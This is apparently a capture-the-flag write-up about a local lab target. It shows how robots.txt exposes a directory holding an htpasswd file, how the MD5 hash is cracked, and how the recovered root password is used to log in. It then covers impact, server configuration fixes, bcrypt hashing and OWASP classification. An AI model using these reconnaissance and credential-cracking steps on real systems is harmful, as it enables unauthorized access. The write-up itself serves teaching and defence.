# Restrict Access Vulnerability (robots.txt Disclosure + Weak Credentials)

## 1. How did I spot the vulnerability?

**Step 1: Checked `robots.txt` for hidden paths**

```bash
curl http://localhost:8080/robots.txt
```

**Output:**
```
User-agent: *
Disallow: /whatever
Disallow: /.hidden
```

The `robots.txt` file revealed two restricted directories: `/whatever/` and `/.hidden/`. This is a common reconnaissance step — `robots.txt` often unintentionally discloses sensitive locations.

**Step 2: Explored the `/whatever/` directory**

Navigated to `/whatever/` and discovered a publicly accessible `.htpasswd` file:

```bash
curl -s http://localhost:8080/whatever/htpasswd
```

**Output:**
```
root:437394baff5aa33daa618be47b75cb49
```

**Step 3: Cracked the password hash**

Identified the hash as MD5 (32 hex characters) using a hash identifier tool. Submitted it to an online MD5 lookup service (e.g., CrackStation) and recovered the plaintext password: `qwerty123@`.

**Step 4: Used the credentials to access the admin area**

Used the recovered credentials to authenticate and retrieve the flag:

```bash
curl -sS -X POST \
  -d "username=root&password=qwerty123%40&Login=Login" \
  http://localhost:8080/admin/ | grep flag
```

---

## 2. What is the vulnerability?

**Information Disclosure via robots.txt + Exposed Credential Files (Misconfiguration)**

The application exposes sensitive directory paths through `robots.txt`, which leads attackers directly to protected areas. Additionally, sensitive credential files (`.htpasswd`) are publicly accessible in the web root. Attackers can discover, crack, and reuse these credentials to gain unauthorized admin access.

---

## 3. Why does it exist (the security flaw)?

- **`robots.txt` acts as a roadmap** — instead of hiding directories, it **advertises** them to attackers
- **Sensitive files (`.htpasswd`) are stored in publicly accessible locations** instead of outside the web root
- **Weak hashing algorithm (MD5)** was used for passwords, enabling instant cracking via rainbow tables or online lookup services
- **Access controls relied on obscurity** (hiding paths) rather than proper authentication and authorization mechanisms
- **No server-side protection** for sensitive files — `.htpasswd` should never be directly accessible via HTTP

---

## 4. What could the impact be?

- **Full unauthorized administrative access** to the application
- **Disclosure or modification of sensitive data** (configuration files, secrets, user data, database credentials)
- **Lateral movement and privilege escalation** within the system or network
- **Account takeover** if the same credentials are reused elsewhere
- **Reputational damage** and potential compliance violations (GDPR, PCI-DSS)

---

## 5. How to fix it (patch)?

### **Core Principle: Never rely on `robots.txt` or obscurity for security.**

### Immediate Fixes:

**1. Remove sensitive paths from `robots.txt`**
- `robots.txt` is for SEO, not security. Don't list sensitive directories here — attackers check it first.

**2. Move `.htpasswd` and configuration files outside the web root**
```bash
# Store credentials outside public directories
/var/www/html/          #  Publicly accessible
/var/www/config/        #  Outside web root
```

**3. Block direct access to sensitive files via web server configuration**

**Apache (.htaccess or httpd.conf):**
```apache
<FilesMatch "^\.ht">
  Require all denied
</FilesMatch>

<Files "*.passwd">
  Require all denied
</Files>
```

**Nginx (nginx.conf):**
```nginx
location ~ /\. {
  deny all;
  access_log off;
  log_not_found off;
}

location ~* \.(htpasswd|htaccess|ini|log|env)$ {
  deny all;
}
```

**4. Use strong, modern password hashing algorithms**
- **Never use MD5** for passwords — it's cryptographically broken
- Use **bcrypt**, **Argon2**, or **PBKDF2** with proper salt and iterations

**Example (bcrypt in PHP):**
```php
$hash = password_hash('qwerty123@', PASSWORD_BCRYPT, ['cost' => 12]);
// Store: $2y$12$...
```

**5. Implement proper server-side authentication**
- Use session-based authentication with server-side validation
- Never rely on HTTP Basic Auth with `.htpasswd` for production applications

**6. Apply least privilege and remove unnecessary exposures**
- Audit all public directories regularly
- Remove debug files, backups, and configuration files from production

**7. Automate security scanning**
```bash
# Scan for exposed sensitive files
nikto -h http://localhost:8080
dirb http://localhost:8080 /usr/share/wordlists/dirb/common.txt
```

---

## 6. Vulnerability classification (OWASP)

**A01:2021 – Broken Access Control**

Specifically:
- **Information Disclosure** via `robots.txt` and publicly accessible credential files
- **Security Misconfiguration** (A05:2021) — exposing `.htpasswd` and using weak cryptographic storage
- **Cryptographic Failures** (A02:2021) — using MD5 for password hashing

This vulnerability chain combines poor access control, misconfiguration, and weak cryptography, allowing trivial privilege escalation.
